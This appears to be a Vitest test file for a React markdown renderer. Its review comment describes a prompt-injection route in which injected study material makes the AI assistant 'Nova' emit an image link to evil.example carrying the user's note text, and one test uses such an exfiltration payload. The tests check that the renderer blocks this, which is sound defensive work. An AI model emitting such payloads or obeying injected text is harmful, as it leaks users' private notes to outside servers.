import { describe, expect, it } from 'vitest';
import { createElement } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import { MarkdownView } from './MarkdownView';

// Review (graded Important): text injected into studied material could make Nova emit
// ![x](https://evil.example/?d=<note text>) — rendering it would send the note to that server without a click.
describe('MarkdownView', () => {
  it('never loads remote images from AI output; shows the alt text instead', () => {
    const html = renderToStaticMarkup(createElement(MarkdownView, { markdown: 'Look: ![diagram of a cell](https://evil.example/leak?d=secret)' }));
    expect(html).not.toContain('<img');
    expect(html).not.toContain('evil.example');
    expect(html).toContain('diagram of a cell');
  });
  it('still renders links safely and drops raw HTML', () => {
    const html = renderToStaticMarkup(createElement(MarkdownView, { markdown: '[docs](https://example.com) <b>raw</b>' }));
    expect(html).toContain('href="https://example.com"');
    expect(html).toContain('rel="noopener noreferrer"');
    expect(html).not.toContain('<b>');
  });
});
